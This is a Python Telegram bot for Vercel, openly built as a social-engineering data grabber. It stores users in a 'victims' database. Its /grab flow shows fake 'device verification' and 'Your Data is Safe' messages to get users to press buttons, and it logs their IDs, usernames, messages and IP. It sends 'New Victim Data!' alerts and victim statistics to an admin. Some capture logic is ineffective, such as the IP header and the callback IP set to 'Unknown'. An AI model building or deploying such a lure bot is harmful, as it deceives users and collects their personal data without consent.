# =============================================
# 🤖 TELEGRAM BOT – Vercel Serverless Version
# =============================================
# Made by Bu SovitX 🔥
# Host: Vercel (Python Runtime)
# =============================================

import json
import sqlite3
import os
import time
import requests
from datetime import datetime
import hashlib

# =============================================
# 🔥 CONFIGURATION (Vercel Environment Variables)
# =============================================

BOT_TOKEN = os.environ.get('BOT_TOKEN')  # From @BotFather
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID')  # Your Telegram ID
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET')  # Security token

# =============================================
# 📦 DATABASE FUNCTIONS
# =============================================

def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect('/tmp/victims.db')  # /tmp is writable on Vercel
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            username TEXT,
            first_name TEXT,
            ip TEXT,
            data TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_victim(user_id, username, first_name, ip, data):
    """Save victim data to database"""
    conn = sqlite3.connect('/tmp/victims.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO victims (user_id, username, first_name, ip, data, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, ip, json.dumps(data), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_all_victims():
    """Get all victims data"""
    conn = sqlite3.connect('/tmp/victims.db')
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return rows

# =============================================
# 🤖 TELEGRAM BOT FUNCTIONS
# =============================================

def send_telegram_message(chat_id, text, reply_markup=None):
    """Send message via Telegram Bot API"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def edit_telegram_message(chat_id, message_id, text):
    """Edit existing message"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error editing message: {e}")
        return None

def answer_callback(callback_id, text):
    """Answer callback query"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    payload = {
        'callback_query_id': callback_id,
        'text': text
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error answering callback: {e}")
        return None

# =============================================
# 🎯 COMMAND HANDLERS
# =============================================

def handle_start(chat_id, user_id, username, first_name):
    """Handle /start command"""
    text = f"""
⚡ *Bu SovitX Data Receiver*
━━━━━━━━━━━━━━━━━━━━━

👋 Hello {first_name}!

Send `/grab` to start data collection.

🔐 *Your Data is Safe*
📱 *Device Verification Required*

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    send_telegram_message(chat_id, text)

def handle_grab(chat_id):
    """Handle /grab command - Show verification buttons"""
    keyboard = {
        'inline_keyboard': [
            [
                {'text': '📱 Verify Device', 'callback_data': 'verify_device'},
                {'text': '📸 Send Data', 'callback_data': 'send_data'}
            ],
            [
                {'text': '📍 Share Location', 'callback_data': 'share_location'}
            ]
        ]
    }
    
    text = """
🔐 *Device Verification Required!*

Click the button below to verify your device and send data.

⚠️ *This is a security check.*
✅ *One-time verification only.*

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    send_telegram_message(chat_id, text, keyboard)

def handle_callback(callback_id, chat_id, message_id, user_id, username, data_type):
    """Handle callback from inline keyboard"""
    
    # Get user IP from request context (passed via webhook)
    ip = 'Unknown'  # Will be captured from request
    
    # Save victim data
    victim_data = {
        'action': data_type,
        'timestamp': datetime.now().isoformat(),
        'user_id': user_id,
        'username': username or 'No Username'
    }
    
    save_victim(str(user_id), username or 'No Username', 'Unknown', ip, victim_data)
    
    # Send confirmation
    answer_callback(callback_id, "✅ Data Received! Device Verified!")
    
    # Edit original message
    new_text = f"""
✅ *Verification Complete!*

Your device has been verified successfully.
Data has been collected.

📱 *Device:* Telegram User
👤 *User ID:* `{user_id}`
🔐 *Status:* Verified

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    edit_telegram_message(chat_id, message_id, new_text)
    
    # Notify admin
    admin_text = f"""
🔔 *New Victim Data!*

👤 *User:* @{username or 'No Username'}
🆔 *ID:* `{user_id}`
📊 *Action:* {data_type}
🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

────────────────────
📱 *Data Saved to Database*
    """
    send_telegram_message(ADMIN_CHAT_ID, admin_text)

# =============================================
# 🌐 MAIN WEBHOOK HANDLER (Vercel Entry Point)
# =============================================

def handler(request):
    """Vercel Serverless Function handler"""
    
    # Initialize database
    init_db()
    
    # Get request data
    if request.method == 'GET':
        # Webhook setup verification
        return {
            'statusCode': 200,
            'body': '✅ Bot is running!'
        }
    
    if request.method == 'POST':
        # Verify webhook secret (optional but recommended)
        if WEBHOOK_SECRET:
            received_secret = request.headers.get('X-Telegram-Webhook-Secret')
            if received_secret != WEBHOOK_SECRET:
                return {
                    'statusCode': 403,
                    'body': 'Unauthorized'
                }
        
        # Parse Telegram update
        try:
            update = request.json
            print(f"Received update: {json.dumps(update)}")
        except:
            return {
                'statusCode': 400,
                'body': 'Invalid JSON'
            }
        
        # Get IP from request
        ip = request.headers.get('x-forwarded-for', 'Unknown').split(',')[0]
        
        # ─── Process Message ───
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', 'No Username')
            first_name = message['from'].get('first_name', 'Unknown')
            text = message.get('text', '')
            
            # Save user info to database
            user_data = {
                'user_id': user_id,
                'username': username,
                'first_name': first_name,
                'ip': ip,
                'message': text,
                'timestamp': datetime.now().isoformat()
            }
            save_victim(str(user_id), username, first_name, ip, user_data)
            
            # Handle commands
            if text == '/start':
                handle_start(chat_id, user_id, username, first_name)
            elif text == '/grab':
                handle_grab(chat_id)
            elif text == '/stats' and str(user_id) == ADMIN_CHAT_ID:
                # Admin command: show stats
                victims = get_all_victims()
                stats_text = f"""
📊 *Victim Statistics*
━━━━━━━━━━━━━━━━━━━━━

📱 *Total Victims:* {len(victims)}

🕐 *Last 5 Victims:*
"""
                for v in victims[:5]:
                    stats_text += f"\n• @{v[2] or 'Unknown'} – {v[6]}"
                
                send_telegram_message(chat_id, stats_text)
            else:
                # Unknown command
                send_telegram_message(chat_id, "⚠️ Unknown command. Send /grab to start.")
        
        # ─── Process Callback Query ───
        elif 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            username = callback['from'].get('username', 'No Username')
            data = callback['data']
            
            handle_callback(callback_id, chat_id, message_id, user_id, username, data)
        
        # ─── Process Inline Query ───
        elif 'inline_query' in update:
            # Inline queries can be handled here
            pass
        
        return {
            'statusCode': 200,
            'body': 'OK'
        }
    
    return {
        'statusCode': 405,
        'body': 'Method Not Allowed'
    }
